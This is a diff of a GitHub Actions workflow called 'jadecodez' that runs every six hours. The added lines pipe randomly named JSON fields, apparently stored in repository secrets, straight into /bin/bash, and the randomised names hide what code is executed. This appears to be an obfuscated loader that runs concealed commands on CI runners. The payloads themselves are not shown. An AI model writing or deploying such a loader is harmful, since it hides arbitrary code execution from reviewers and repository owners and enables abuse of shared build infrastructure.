@@ -3,25 +3,30 @@ name: jadecodez
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
-
+    - cron: '43 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jadecodez
         env:
-          ic3230: ${{ secrets.ic3230 }}
+          i3986: ${{ secrets.i3986 }}
         run: |
-          echo $ic3230 | jq -r .o180 | /bin/bash
-          echo $zm30048 | jq -r .zdp1 | /bin/bash
-          echo $yxe66742 | jq -r .pu8 | /bin/bash
-          echo $ubgt8428 | jq -r .zdls04137 | /bin/bash
-          echo $sayl63 | jq -r .x7079 | /bin/bash
-          echo $pucq932 | jq -r .xy28 | /bin/bash
-          echo $alups13 | jq -r .onfdz5 | /bin/bash
-          echo $fyc61 | jq -r .brsl91 | /bin/bash
-          echo $sevog5007 | jq -r .tdxx9207 | /bin/bash
-          echo $c7 | jq -r .pxxas700 | /bin/bash
+          echo $i3986 | jq -r .byd7555 | /bin/bash
+          echo $b261 | jq -r .bjger5343 | /bin/bash
+          echo $ts17 | jq -r .ro4589 | /bin/bash
+          echo $oe3201 | jq -r .b4689 | /bin/bash
+          echo $vaxrj04810 | jq -r .ra43346 | /bin/bash
+          echo $pu87094 | jq -r .yjjr841 | /bin/bash
+          echo $rskyv7141 | jq -r .kz29716 | /bin/bash
+          echo $x9 | jq -r .srg5 | /bin/bash
+          echo $rqe21289 | jq -r .qpzz7016 | /bin/bash
+          echo $iwo8557 | jq -r .dkwcj4 | /bin/bash
+          echo $n62651 | jq -r .aa04 | /bin/bash
+          echo $p014 | jq -r .ua1214 | /bin/bash
+          echo $xzhb76 | jq -r .a0357 | /bin/bash
+          echo $eqy33086 | jq -r .uc3347 | /bin/bash
+          echo $awtdr3973 | jq -r .rl96127 | /bin/bash
 
